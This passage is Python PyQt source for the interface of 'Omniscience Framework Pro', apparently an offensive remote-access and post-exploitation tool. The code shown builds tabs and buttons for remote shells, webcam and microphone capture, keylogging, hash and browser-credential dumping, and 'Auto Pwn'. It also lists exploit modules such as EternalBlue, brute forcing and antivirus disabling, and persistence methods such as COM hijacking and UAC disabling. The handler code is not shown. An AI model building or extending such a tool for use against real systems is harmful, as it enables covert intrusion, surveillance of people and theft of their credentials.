        self.tabs.addTab(self.create_sessions_tab(), "🔗 Sessions")
        
        # Messages Tab
        self.tabs.addTab(self.create_messages_tab(), "💬 Messages")
        
        # PC Control Tab
        self.tabs.addTab(self.create_control_tab(), "🖥️ PC Control")
        
        # Exploit Tab
        self.tabs.addTab(self.create_exploit_tab(), "💥 Exploit")
        
        # Persistence Tab
        self.tabs.addTab(self.create_persistence_tab(), "🔒 Persistence")
        
        # Credentials Tab
        self.tabs.addTab(self.create_credentials_tab(), "🔑 Credentials")
        
        # Settings Tab
        self.tabs.addTab(self.create_settings_tab(), "⚙️ Settings")
        
        main_layout.addWidget(self.tabs, 4)
        
        # Create menu bar
        self.create_menu_bar()
        
        # Create status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("Ready - Omniscience Framework Pro v2.0 [Real Mode]")
        
        # Status indicators
        self.status_label = QLabel("● LIVE")
        self.status_label.setStyleSheet(f"color: {SUCCESS}; font-size: 12px; font-weight: bold;")
        self.status_bar.addPermanentWidget(self.status_label)
        
        self.scan_progress = QProgressBar()
        self.scan_progress.setMaximumWidth(200)
        self.scan_progress.setVisible(False)
        self.status_bar.addPermanentWidget(self.scan_progress)
        
        self.msg_indicator = QLabel("📬 0")
        self.msg_indicator.setStyleSheet(f"color: {ACCENT}; font-size: 12px;")
        self.status_bar.addPermanentWidget(self.msg_indicator)

    def create_left_panel(self):
        """Create left navigation panel with futuristic logo"""
        frame = QFrame()
        frame.setFrameStyle(QFrame.Shape.StyledPanel)
        frame.setFixedWidth(240)
        layout = QVBoxLayout(frame)
        
        # Futuristic Gradient Logo Container
        logo_container = QFrame()
        logo_container.setStyleSheet(f"""
            QFrame {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                    stop:0 #000033, 
                    stop:0.5 #1a0033, 
                    stop:1 #001a33);
                border: 2px solid {ACCENT};
                border-radius: 15px;
                padding: 20px;
            }}
        """)
        logo_layout = QVBoxLayout(logo_container)
        
        # Logo symbol
        logo_symbol = QLabel("◈")
        logo_symbol.setStyleSheet(f"""
            color: {ACCENT};
            font-size: 40px;
            text-shadow: 0 0 20px {ACCENT}, 0 0 40px {ACCENT};
        """)
        logo_symbol.setAlignment(Qt.AlignmentFlag.AlignCenter)
        logo_layout.addWidget(logo_symbol)
        
        logo_text = QLabel("OMNISCIENCE")
        logo_text.setStyleSheet(f"""
            color: {ACCENT};
            font-size: 20px;
            font-weight: bold;
            font-family: 'Consolas';
            text-shadow: 0 0 15px {ACCENT};
        """)
        logo_text.setAlignment(Qt.AlignmentFlag.AlignCenter)
        logo_layout.addWidget(logo_text)
        
        subtitle = QLabel("FRAMEWORK PRO")
        subtitle.setStyleSheet(f"""
            color: {PURPLE};
            font-size: 12px;
            font-weight: bold;
            font-family: 'Consolas';
            text-shadow: 0 0 10px {PURPLE};
        """)
        subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
        logo_layout.addWidget(subtitle)
        
        version = QLabel("⚡ v2.0 [REAL MODE]")
        version.setStyleSheet(f"""
            color: {ACCENT3};
            font-size: 10px;
            font-family: 'Consolas';
            text-shadow: 0 0 8px {ACCENT3};
        """)
        version.setAlignment(Qt.AlignmentFlag.AlignCenter)
        logo_layout.addWidget(version)
        
        layout.addWidget(logo_container)
        
        layout.addSpacing(20)
        
        # Scan buttons with glow effect
        btn_scan = QPushButton("🔍 NETWORK SCAN")
        btn_scan.setStyleSheet(f"""
            QPushButton {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 {ACCENT}, stop:1 {CYAN});
                color: {DARKER_BG};
                border: none;
                padding: 15px;
                font-weight: bold;
                border-radius: 8px;
                font-family: 'Consolas';
                font-size: 12px;
                text-transform: uppercase;
                letter-spacing: 1px;
            }}
            QPushButton:hover {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 {ACCENT3}, stop:1 {ACCENT});
                box-shadow: 0 0 25px {ACCENT};
            }}
        """)
        btn_scan.clicked.connect(self.quick_scan)
        layout.addWidget(btn_scan)
        
        btn_full = QPushButton("🔎 FULL SCAN")
        btn_full.setStyleSheet(f"""
            QPushButton {{
                background: transparent;
                color: {ACCENT};
                border: 2px solid {ACCENT};
                padding: 12px;
                border-radius: 8px;
                font-family: 'Consolas';
                font-size: 11px;
            }}
            QPushButton:hover {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 {ACCENT}, stop:1 {PURPLE});
                color: {DARKER_BG};
                box-shadow: 0 0 20px {ACCENT};
            }}
        """)
        btn_full.clicked.connect(self.full_scan)
        layout.addWidget(btn_full)
        
        layout.addSpacing(15)
        
        # Quick actions section
        actions_label = QLabel("► QUICK ACTIONS")
        actions_label.setStyleSheet(f"color: {ACCENT}; font-size: 11px; font-weight: bold; font-family: 'Consolas'; text-shadow: 0 0 5px {ACCENT};")
        layout.addWidget(actions_label)
        
        quick_actions = [
            ("💻 Remote Shell", self.remote_shell),
            ("🚀 EXTERNAL SHELL", self.launch_external_terminal),
            ("🖥️ Screenshot", self.take_screenshot),
            ("📷 Webcam", self.capture_webcam),
            ("🔑 Hash Dump", self.dump_hashes),
            ("💬 Send Msg", self.show_send_message),
            ("🎯 Auto Pwn", self.auto_pwn),
        ]
        
        for label, func in quick_actions:
            btn = QPushButton(label)
            btn.setStyleSheet(f"""
                QPushButton {{
                    background-color: {DARKER_BG};
                    color: {TEXT};
                    border: 1px solid {TEXT_DIM};
                    padding: 10px;
                    text-align: left;
                    border-radius: 5px;
                    font-family: 'Consolas';
                    font-size: 11px;
                }}
                QPushButton:hover {{
                    background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                        stop:0 {ACCENT}, stop:1 {PURPLE});
                    color: {DARKER_BG};
                    border-color: {ACCENT};
                    box-shadow: 0 0 15px {ACCENT};
                }}
            """)
            btn.clicked.connect(func)
            layout.addWidget(btn)
            
        layout.addStretch()
        
        # Live Statistics - Futuristic style
        stats_group = QGroupBox("◈ LIVE STATISTICS")
        stats_group.setStyleSheet(f"""
            QGroupBox {{
                color: {ACCENT};
                border: 2px solid {ACCENT};
                border-radius: 10px;
                margin-top: 15px;
                padding-top: 15px;
                font-family: 'Consolas';
                font-size: 11px;
                background-color: rgba(0, 240, 255, 0.05);
            }}
            QGroupBox::title {{
                text-shadow: 0 0 10px {ACCENT};
            }}
        """)
        stats_layout = QFormLayout(stats_group)
        
        self.hosts_online = QLabel("0")
        self.hosts_online.setStyleSheet(f"color: {ACCENT3}; font-weight: bold; font-size: 18px; text-shadow: 0 0 10px {ACCENT3};")
        stats_layout.addRow("🌐 Hosts Online:", self.hosts_online)
        
        self.sessions_count = QLabel("0")
        self.sessions_count.setStyleSheet(f"color: {ACCENT}; font-weight: bold; font-size: 18px; text-shadow: 0 0 10px {ACCENT};")
        stats_layout.addRow("🔗 Sessions:", self.sessions_count)
        
        self.connections_count = QLabel("0")
        self.connections_count.setStyleSheet(f"color: {CYAN}; font-weight: bold; font-size: 18px; text-shadow: 0 0 10px {CYAN};")
        stats_layout.addRow("⚡ Connections:", self.connections_count)
        
        self.messages_count = QLabel("0")
        self.messages_count.setStyleSheet(f"color: {PURPLE}; font-weight: bold; font-size: 18px; text-shadow: 0 0 10px {PURPLE};")
        stats_layout.addRow("💬 Messages:", self.messages_count)
        
        layout.addWidget(stats_group)
        
        return frame
        
    def create_dashboard_tab(self):
        """Create dashboard tab with real-time data"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Header
        header = QLabel("◈ DASHBOARD OVERVIEW")
        header.setStyleSheet(f"color: {ACCENT}; font-size: 20px; font-weight: bold; font-family: Consolas;")
        layout.addWidget(header)
        
        # Stats cards
        cards_layout = QHBoxLayout()
        
        card1 = self.create_stat_card("🌐", "Network Status", "ACTIVE", SUCCESS)
        cards_layout.addWidget(card1)
        
        card2 = self.create_stat_card("🔍", "Last Scan", "Ready", ACCENT)
        cards_layout.addWidget(card2)
        
        card3 = self.create_stat_card("🔗", "Sessions", "0 Active", WARNING)
        cards_layout.addWidget(card3)
        
        card4 = self.create_stat_card("⚡", "CLI Mode", "REAL", PURPLE)
        cards_layout.addWidget(card4)
        
        layout.addLayout(cards_layout)
        
        # Real-time activity log
        activity_group = QGroupBox("◈ REAL-TIME ACTIVITY LOG")
        activity_group.setStyleSheet(self.get_group_style())
        
        activity_layout = QVBoxLayout(activity_group)
        
        self.activity_log = QTextEdit()
        self.activity_log.setReadOnly(True)
        self.activity_log.setStyleSheet(f"""
            QTextEdit {{
                background-color: {DARKER_BG};
                color: {TEXT};
                border: 1px solid {TEXT_DIM};
                font-family: Consolas;
                font-size: 11px;
            }}
        """)
        activity_layout.addWidget(self.activity_log)
        layout.addWidget(activity_group)
        
        # Quick commands
        commands_group = QGroupBox("◈ QUICK COMMAND EXECUTION")
        commands_group.setStyleSheet(self.get_group_style())
        
        commands_layout = QHBoxLayout(commands_group)
        
        self.quick_cmd = QLineEdit()
        self.quick_cmd.setPlaceholderText("Enter command (help for 140+ commands)...")
        self.quick_cmd.setStyleSheet(f"""
            QLineEdit {{
                background-color: {DARKER_BG};
                color: {TEXT};
                border: 1px solid {ACCENT};
                padding: 10px;
                font-family: Consolas;
                border-radius: 3px;
            }}
        """)
        self.quick_cmd.returnPressed.connect(self.execute_quick_command)
        commands_layout.addWidget(self.quick_cmd, 4)
        
        btn_exec = QPushButton("▶ EXECUTE")
        btn_exec.setStyleSheet(f"""
            QPushButton {{
                background-color: {SUCCESS};
                color: {DARK_BG};
                border: none;
                padding: 10px 20px;
                font-weight: bold;
                border-radius: 3px;
                font-family: Consolas;
            }}
        """)
        btn_exec.clicked.connect(self.execute_quick_command)
        commands_layout.addWidget(btn_exec, 1)
        
        layout.addWidget(commands_group)
        
        return widget
    
    def get_group_style(self):
        return f"""
            QGroupBox {{
                color: {ACCENT};
                border: 1px solid {TEXT_DIM};
                border-radius: 5px;
                margin-top: 10px;
                padding-top: 10px;
                font-family: Consolas;
                font-size: 12px;
                font-weight: bold;
            }}
            QGroupBox::title {{
                subcontrol-origin: margin;
                subcontrol-position: top left;
                padding: 0 5px;
            }}
        """

    def create_stat_card(self, icon, title, value, color):
        """Create a statistics card"""
        card = QFrame()
        card.setFrameStyle(QFrame.Shape.StyledPanel)
        card.setStyleSheet(f"""
            QFrame {{
                background-color: {DARKER_BG};
                border: 2px solid {color};
                border-radius: 10px;
                padding: 15px;
            }}
        """)
        
        layout = QVBoxLayout(card)
        layout.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        icon_label = QLabel(icon)
        icon_label.setStyleSheet("font-size: 30px;")
        icon_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(icon_label)
        
        title_label = QLabel(title)
        title_label.setStyleSheet(f"color: {TEXT_DIM}; font-size: 11px; font-family: Consolas;")
        title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(title_label)
        
        value_label = QLabel(value)
        value_label.setStyleSheet(f"color: {color}; font-size: 18px; font-weight: bold; font-family: Consolas;")
        value_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(value_label)
        
        return card

    def create_network_tab(self):
        """Create network topology tab with real connections"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Header with controls
        header_layout = QHBoxLayout()
        
        title = QLabel("◈ NETWORK TOPOLOGY VISUALIZATION")
        title.setStyleSheet(f"color: {ACCENT}; font-size: 18px; font-weight: bold; font-family: Consolas;")
        header_layout.addWidget(title)
        
        header_layout.addStretch()
        
        btn_refresh = QPushButton("🔄 Refresh")
        btn_refresh.clicked.connect(self.refresh_topology)
        header_layout.addWidget(btn_refresh)
        
        btn_export = QPushButton("💾 Export")
        btn_export.clicked.connect(self.export_topology)
        header_layout.addWidget(btn_export)
        
        layout.addLayout(header_layout)
        
        # Network visualization
        self.network_view = QGraphicsView(self.network_scene)
        self.network_view.setRenderHint(QPainter.RenderHint.Antialiasing)
        self.network_view.setStyleSheet(f"""
            QGraphicsView {{
                background-color: {DARK_BG};
                border: 1px solid {ACCENT};
                border-radius: 5px;
            }}
        """)
        layout.addWidget(self.network_view)
        
        # Real-time connections panel
        conn_group = QGroupBox("◈ ACTIVE CONNECTIONS")
        conn_group.setStyleSheet(self.get_group_style())
        
        conn_layout = QHBoxLayout(conn_group)
        
        # Connections table
        self.connections_table = QTableWidget()
        self.connections_table.setColumnCount(5)
        self.connections_table.setHorizontalHeaderLabels(["Local IP", "Remote IP", "Protocol", "Port", "Status"])
        self.connections_table.setStyleSheet(f"""
            QTableWidget {{
                background-color: {DARKER_BG};
                color: {TEXT};
                gridline-color: {TEXT_DIM};
                border: none;
                font-family: Consolas;
                font-size: 11px;
            }}
            QHeaderView::section {{
                background-color: {DARK_BG};
                color: {ACCENT};
                padding: 5px;
                border: none;
                font-weight: bold;
            }}
        """)
        conn_layout.addWidget(self.connections_table, 2)
        
        layout.addWidget(conn_group)
        
        # Host table
        table_group = QGroupBox("◈ DISCOVERED HOSTS")
        table_group.setStyleSheet(self.get_group_style())
        
        table_layout = QVBoxLayout(table_group)
        
        self.hosts_table = QTableWidget()
        self.hosts_table.setColumnCount(7)
        self.hosts_table.setHorizontalHeaderLabels(["IP Address", "Hostname", "MAC", "Vendor", "OS", "Status", "Ports"])
        self.hosts_table.setStyleSheet(f"""
            QTableWidget {{
                background-color: {DARKER_BG};
                color: {TEXT};
                gridline-color: {TEXT_DIM};
                border: none;
                font-family: Consolas;
                font-size: 11px;
            }}
            QHeaderView::section {{
                background-color: {DARK_BG};
                color: {ACCENT};
                padding: 5px;
                border: none;
                font-weight: bold;
            }}
        """)
        table_layout.addWidget(self.hosts_table)
        
        layout.addWidget(table_group)
        
        return widget

    def create_cli_tab(self):
        """Create Real CLI tab - fully functional CLI"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Header
        header = QLabel("◈ OMNISCIENCE REAL CLI - FULL FUNCTIONALITY")
        header.setStyleSheet(f"color: {PURPLE}; font-size: 18px; font-weight: bold; font-family: Consolas;")
        layout.addWidget(header)
        
        # CLI Output (large terminal)
        self.cli_output = QTextEdit()
        self.cli_output.setReadOnly(True)
        self.cli_output.setStyleSheet(f"""
            QTextEdit {{
                background-color: #0d0d0d;
                color: #00ff00;
                font-family: Consolas, 'Courier New';
                font-size: 13px;
                border: 2px solid {PURPLE};
                border-radius: 5px;
                padding: 10px;
            }}
        """)
        layout.addWidget(self.cli_output)
        
        # CLI Input
        input_layout = QHBoxLayout()
        
        prompt = QLabel("Omniscience»")
        prompt.setStyleSheet(f"color: {PURPLE}; font-family: Consolas; font-weight: bold; font-size: 14px;")
        input_layout.addWidget(prompt)
        
        self.cli_input = QLineEdit()
        self.cli_input.setStyleSheet(f"""
            QLineEdit {{
                background-color: {DARKER_BG};
                color: #00ff00;
                border: 1px solid {PURPLE};
                padding: 10px;
                font-family: Consolas, 'Courier New';
                font-size: 13px;
                border-radius: 3px;
            }}
        """)
        self.cli_input.returnPressed.connect(self.execute_cli_input)
        input_layout.addWidget(self.cli_input)
        
        # Clear button
        btn_clear = QPushButton("Clear")
        btn_clear.setStyleSheet(f"""
            QPushButton {{
                background-color: {DARKER_BG};
                color: {TEXT};
                border: 1px solid {TEXT_DIM};
                padding: 5px 15px;
                border-radius: 3px;
                font-family: Consolas;
            }}
        """)
        btn_clear.clicked.connect(lambda: self.cli_output.clear())
        input_layout.addWidget(btn_clear)
        
        layout.addLayout(input_layout)
        
        # Help button
        btn_help = QPushButton("📖 Show All Commands (140+)")
        btn_help.setStyleSheet(f"""
            QPushButton {{
                background-color: {PURPLE};
                color: {DARK_BG};
                padding: 10px;
                font-weight: bold;
                border-radius: 5px;
                font-family: Consolas;
            }}
        """)
        btn_help.clicked.connect(self.show_cli_help)
        layout.addWidget(btn_help)
        
        # Initialize CLI with welcome message
        self.cli_output.append("""╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║          ◈ OMNISCIENCE FRAMEWORK PRO - REAL CLI v2.0 ◈                    ║
║                                                                              ║
║  Welcome to the real CLI mode! This terminal works both:                    ║
║    • Inside this GUI (as you're using now)                                  ║
║    • As a standalone CLI application                                        ║
║                                                                              ║
║  Type 'help' for all available commands or 'show network' for real data.  ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
""")
        
        return widget

    def create_sessions_tab(self):
        """Create sessions management tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        title = QLabel("◈ ACTIVE SESSIONS MANAGEMENT")
        title.setStyleSheet(f"color: {ACCENT}; font-size: 20px; font-weight: bold; font-family: Consolas;")
        layout.addWidget(title)
        
        # Sessions table
        self.sessions_table = QTableWidget()
        self.sessions_table.setColumnCount(6)
        self.sessions_table.setHorizontalHeaderLabels(["Session ID", "Target IP", "Platform", "User", "Status", "Created"])
        self.sessions_table.setStyleSheet(f"""
            QTableWidget {{
                background-color: {DARKER_BG};
                color: {TEXT};
                gridline-color: {TEXT_DIM};
                font-family: Consolas;
            }}
        """)
        layout.addWidget(self.sessions_table)
        
        # Buttons
        btn_layout = QHBoxLayout()
        
        btn_new = QPushButton("+ New Session")
        btn_new.setStyleSheet(f"""
            QPushButton {{
                background-color: {SUCCESS};
                color: {DARK_BG};
                padding: 10px 20px;
                font-weight: bold;
                border-radius: 5px;
                font-family: Consolas;
            }}
        """)
        btn_new.clicked.connect(self.new_session)
        btn_layout.addWidget(btn_new)
        
        btn_interact = QPushButton("🔗 Interact")
        btn_interact.clicked.connect(self.interact_session)
        btn_layout.addWidget(btn_interact)
        
        btn_kill = QPushButton("✕ Kill Session")
        btn_kill.setStyleSheet(f"""
            QPushButton {{
                background-color: {ERROR};
                color: white;
                padding: 10px 20px;
                font-weight: bold;
                border-radius: 5px;
                font-family: Consolas;
            }}
        """)
        btn_kill.clicked.connect(self.kill_session)
        btn_layout.addWidget(btn_kill)
        
        layout.addLayout(btn_layout)
        
        return widget

    def create_messages_tab(self):
        """Create messaging/chat tab for PC-to-PC communication"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        title = QLabel("◈ PC-TO-PC MESSAGING")
        title.setStyleSheet(f"color: {PURPLE}; font-size: 20px; font-weight: bold; font-family: Consolas;")
        layout.addWidget(title)
        
        # Split layout for messages
        msg_layout = QHBoxLayout()
        
        # Inbox
        inbox_group = QGroupBox("◈ INBOX")
        inbox_group.setStyleSheet(self.get_group_style())
        inbox_layout = QVBoxLayout(inbox_group)
        
        self.inbox_list = QListWidget()
        self.inbox_list.setStyleSheet(f"""
            QListWidget {{
                background-color: {DARKER_BG};
                color: {TEXT};
                border: 1px solid {TEXT_DIM};
                font-family: Consolas;
            }}
        """)
        inbox_layout.addWidget(self.inbox_list)
        
        msg_layout.addWidget(inbox_group, 2)
        
        # Message detail
        detail_group = QGroupBox("◈ MESSAGE DETAIL")
        detail_group.setStyleSheet(self.get_group_style())
        detail_layout = QVBoxLayout(detail_group)
        
        self.msg_detail = QTextEdit()
        self.msg_detail.setReadOnly(True)
        self.msg_detail.setStyleSheet(f"""
            QTextEdit {{
                background-color: {DARKER_BG};
                color: {TEXT};
                border: 1px solid {TEXT_DIM};
                font-family: Consolas;
            }}
        """)
        detail_layout.addWidget(self.msg_detail)
        
        msg_layout.addWidget(detail_group, 3)
        
        layout.addLayout(msg_layout)
        
        # Send message
        send_layout = QHBoxLayout()
        
        send_layout.addWidget(QLabel("To IP:"))
        self.msg_target = QLineEdit()
        self.msg_target.setPlaceholderText("Target IP address")
        self.msg_target.setStyleSheet(f"""
            QLineEdit {{
                background-color: {DARKER_BG};
                color: {TEXT};
                border: 1px solid {TEXT_DIM};
                padding: 5px;
                font-family: Consolas;
            }}
        """)
        send_layout.addWidget(self.msg_target)
        
        send_layout.addWidget(QLabel("Message:"))
        self.msg_text = QLineEdit()
        self.msg_text.setPlaceholderText("Enter message...")
        self.msg_text.setStyleSheet(f"""
            QLineEdit {{
                background-color: {DARKER_BG};
                color: {TEXT};
                border: 1px solid {TEXT_DIM};
                padding: 5px;
                font-family: Consolas;
            }}
        """)
        send_layout.addWidget(self.msg_text, 3)
        
        btn_send = QPushButton("📤 SEND")
        btn_send.setStyleSheet(f"""
            QPushButton {{
                background-color: {PURPLE};
                color: white;
                padding: 8px 20px;
                font-weight: bold;
                border-radius: 5px;
                font-family: Consolas;
            }}
        """)
        btn_send.clicked.connect(self.send_message)
        send_layout.addWidget(btn_send)
        
        layout.addLayout(send_layout)
        
        return widget

    def create_control_tab(self):
        """Create PC Control tab for real remote control"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        title = QLabel("◈ REMOTE PC CONTROL")
        title.setStyleSheet(f"color: {ACCENT2}; font-size: 20px; font-weight: bold; font-family: Consolas;")
        layout.addWidget(title)
        
        # Control panel
        control_layout = QHBoxLayout()
        
        # Left - Target info
        target_group = QGroupBox("◈ TARGET CONNECTION")
        target_group.setStyleSheet(self.get_group_style())
        target_layout = QFormLayout(target_group)
        
        self.target_ip = QLineEdit()
        self.target_ip.setPlaceholderText("192.168.1.x")
        target_layout.addRow("Target IP:", self.target_ip)
        
        self.target_user = QLineEdit()
        self.target_user.setPlaceholderText("Administrator")
        target_layout.addRow("Username:", self.target_user)
        
        self.target_pass = QLineEdit()
        self.target_pass.setEchoMode(QLineEdit.EchoMode.Password)
        self.target_pass.setPlaceholderText("Password")
        target_layout.addRow("Password:", self.target_pass)
        
        btn_connect = QPushButton("🔗 CONNECT")
        btn_connect.setStyleSheet(f"""
            QPushButton {{
                background-color: {SUCCESS};
                color: {DARK_BG};
                padding: 10px;
                font-weight: bold;
                border-radius: 5px;
                font-family: Consolas;
            }}
        """)
        btn_connect.clicked.connect(self.connect_to_target)
        target_layout.addRow("", btn_connect)
        
        control_layout.addWidget(target_group)
        
        # Right - Control buttons
        buttons_group = QGroupBox("◈ CONTROL ACTIONS")
        buttons_group.setStyleSheet(self.get_group_style())
        buttons_layout = QVBoxLayout(buttons_group)
        
        control_buttons = [
            ("💻 Shell", self.remote_shell),
            ("📸 Screenshot", self.take_screenshot),
            ("📷 Webcam", self.capture_webcam),
            ("🔑 Hash Dump", self.dump_hashes),
            ("📋 Clipboard", self.get_clipboard),
            ("📜 Keylogger", self.start_keylogger),
            ("⚙️ Processes", self.list_processes),
            ("🛠️ Services", self.list_services_cmd),
        ]
        
        for label, func in control_buttons:
            btn = QPushButton(label)
            btn.setStyleSheet(f"""
                QPushButton {{
                    background-color: {DARKER_BG};
                    color: {TEXT};
                    border: 1px solid {ACCENT2};
                    padding: 10px;
                    border-radius: 5px;
                    font-family: Consolas;
                }}
                QPushButton:hover {{
                    background-color: {ACCENT2};
                    color: white;
                }}
            """)
            btn.clicked.connect(func)
            buttons_layout.addWidget(btn)
        
        control_layout.addWidget(buttons_group)
        
        layout.addLayout(control_layout)
        
        # Output
        output_group = QGroupBox("◈ CONTROL OUTPUT")
        output_group.setStyleSheet(self.get_group_style())
        
        output_layout = QVBoxLayout(output_group)
        
        self.control_output = QTextEdit()
        self.control_output.setReadOnly(True)
        self.control_output.setStyleSheet(f"""
            QTextEdit {{
                background-color: #0d0d0d;
                color: #00ff00;
                font-family: Consolas;
                font-size: 11px;
                border: 1px solid {ACCENT2};
            }}
        """)
        output_layout.addWidget(self.control_output)
        
        layout.addWidget(output_group)
        
        return widget

    def create_exploit_tab(self):
        """Create exploitation tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        title = QLabel("◈ EXPLOITATION TOOLS")
        title.setStyleSheet(f"color: {ERROR}; font-size: 20px; font-weight: bold; font-family: Consolas;")
        layout.addWidget(title)
        
        # Exploit categories
        splitter = QSplitter(Qt.Orientation.Horizontal)
        
        # Left - Exploit list
        left_widget = QWidget()
        left_layout = QVBoxLayout(left_widget)
        
        exploit_label = QLabel("◈ EXPLOIT MODULES")
        exploit_label.setStyleSheet(f"color: {ACCENT}; font-weight: bold; font-family: Consolas;")
        left_layout.addWidget(exploit_label)
        
        self.exploit_list = QListWidget()
        exploits = [
            "auxiliary/scanner/smb/smb_ms17_010 - EternalBlue Scanner",
            "auxiliary/scanner/ssh/ssh_login - SSH Brute Force",
            "auxiliary/scanner/rdp/rdp_login - RDP Brute Force",
            "auxiliary/scanner/telnet/telnet_login - Telnet Brute",
            "auxiliary/scanner/vnc/vnc_login - VNC Brute Force",
            "exploit/windows/smb/psexec - PsExec",
            "exploit/windows/smb/ms08_067 - MS08-067",
            "exploit/multi/handler - Reverse Shell Handler",
            "post/windows/gather/credentials/gather - Creds",
            "post/windows/gather/hashdump - Hash Dump",
            "post/windows/gather/wifi - WiFi Passwords",
            "post/windows/manage/enable_rdp - Enable RDP",
            "post/windows/manage/killav - Disable AV",
            "post/multi/manage/shell_to_meterpreter",
            "post/windows/gather/clipboard - Clipboard",
            "post/windows/gather/keylogrecorder - Keylogger",
            "post/windows/gather/webcam - Webcam Capture",
            "post/windows/gather/microphone - Audio Record",
            "post/windows/gather/screenshot - Screenshot",
            "post/windows/gather/process_list - Process List",
            "post/windows/manage/persistence - Persistence",
            "post/windows/manage/steal_token - Token Steal",
        ]
        for exp in exploits:
            self.exploit_list.addItem(exp)
            
        self.exploit_list.setStyleSheet(f"""
            QListWidget {{
                background-color: {DARKER_BG};
                color: {TEXT};
                border: 1px solid {TEXT_DIM};
                font-family: Consolas;
                font-size: 11px;
            }}
            QListWidget::item:selected {{
                background-color: {ERROR};
                color: white;
            }}
        """)
        left_layout.addWidget(self.exploit_list)
        
        splitter.addWidget(left_widget)
        
        # Right - Options
        right_widget = QWidget()
        right_layout = QVBoxLayout(right_widget)
        
        options_label = QLabel("◈ OPTIONS")
        options_label.setStyleSheet(f"color: {ACCENT}; font-weight: bold; font-family: Consolas;")
        right_layout.addWidget(options_label)
        
        # Target input
        target_group = QGroupBox("Target")
        target_group.setStyleSheet(self.get_group_style())
        target_layout = QFormLayout(target_group)
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("RHOSTS (e.g., 192.168.1.1)")
        target_layout.addRow("RHOSTS:", self.target_input)
        right_layout.addWidget(target_group)
        
        # Action buttons
        btn_run = QPushButton("🚀 RUN EXPLOIT")
        btn_run.setStyleSheet(f"""
            QPushButton {{
                background-color: {ERROR};
                color: white;
                padding: 15px;
                font-weight: bold;
                border-radius: 5px;
                font-family: Consolas;
            }}
        """)
        btn_run.clicked.connect(self.run_exploit)
        right_layout.addWidget(btn_run)
        
        btn_check = QPushButton("🔍 CHECK")
        btn_check.clicked.connect(self.check_exploit)
        right_layout.addWidget(btn_check)
        
        right_layout.addStretch()
        
        splitter.addWidget(right_widget)
        splitter.setSizes([400, 300])
        
        layout.addWidget(splitter)
        
        return widget

    def create_persistence_tab(self):
        """Create persistence tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        title = QLabel("◈ PERSISTENCE MECHANISMS")
        title.setStyleSheet(f"color: {WARNING}; font-size: 20px; font-weight: bold; font-family: Consolas;")
        layout.addWidget(title)
        
        # Persistence methods
        methods_group = QGroupBox("◈ PERSISTENCE METHODS")
        methods_group.setStyleSheet(self.get_group_style())
        methods_layout = QVBoxLayout(methods_group)
        
        self.persist_methods = QListWidget()
        methods = [
            "registry - Registry Run Keys",
            "scheduled_task - Scheduled Tasks",
            "service - Windows Service",
            "wmi - WMI Event Subscription",
            "comhijack - COM Hijacking",
            "appinit_dll - AppInit DLLs",
            "ssp - Security Support Provider",
            "etw_provider - ETW Provider",
            "registry_powershell - PowerShell Profile",
            "schtasks - Scheduled Task (XML)",
            "service_named - Named Service",
            "service_exe - Service with EXE",
            "useradd - Create New User",
            "enable_rdp - Enable RDP Permanently",
            "disable_uac - Disable UAC",
            "add_user_localgroup - Add to Local Group",
        ]
        for m in methods:
            self.persist_methods.addItem(m)
            
        self.persist_methods.setStyleSheet(f"""
            QListWidget {{
                background-color: {DARKER_BG};
                color: {TEXT};
                font-family: Consolas;
            }}
        """)
        methods_layout.addWidget(self.persist_methods)
        
        layout.addWidget(methods_group)
        
        # Options
        options_layout = QHBoxLayout()
        
        btn_install = QPushButton("✓ INSTALL PERSISTENCE")
        btn_install.setStyleSheet(f"""
            QPushButton {{
                background-color: {SUCCESS};
                color: {DARK_BG};
                padding: 10px;
                font-weight: bold;
                font-family: Consolas;
            }}
        """)
        btn_install.clicked.connect(self.install_persistence)
        options_layout.addWidget(btn_install)
        
        btn_remove = QPushButton("✕ REMOVE PERSISTENCE")
        btn_remove.clicked.connect(self.remove_persistence)
        options_layout.addWidget(btn_remove)
        
        layout.addLayout(options_layout)
        
        return widget

    def create_credentials_tab(self):
        """Create credentials tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        title = QLabel("◈ CREDENTIAL MANAGER")
        title.setStyleSheet(f"color: {WARNING}; font-size: 20px; font-weight: bold; font-family: Consolas;")
        layout.addWidget(title)
        
        # Credentials table
        self.creds_table = QTableWidget()
        self.creds_table.setColumnCount(5)
        self.creds_table.setHorizontalHeaderLabels(["Type", "Username", "Password/Hash", "Target", "Timestamp"])
        self.creds_table.setStyleSheet(f"""
            QTableWidget {{
                background-color: {DARKER_BG};
                color: {TEXT};
                gridline-color: {TEXT_DIM};
                font-family: Consolas;
            }}
        """)
        layout.addWidget(self.creds_table)
        
        # Buttons
        btn_layout = QHBoxLayout()
        
        btn_dump = QPushButton("🗑️ DUMP ALL CREDENTIALS")
        btn_dump.setStyleSheet(f"background-color: {ERROR}; color: white; padding: 10px; font-family: Consolas; font-weight: bold;")
        btn_dump.clicked.connect(self.dump_credentials)
        btn_layout.addWidget(btn_dump)
        
        btn_browser = QPushButton("🌐 Browser Creds")
        btn_browser.clicked.connect(self.dump_browser_creds)
        btn_layout.addWidget(btn_browser)
        
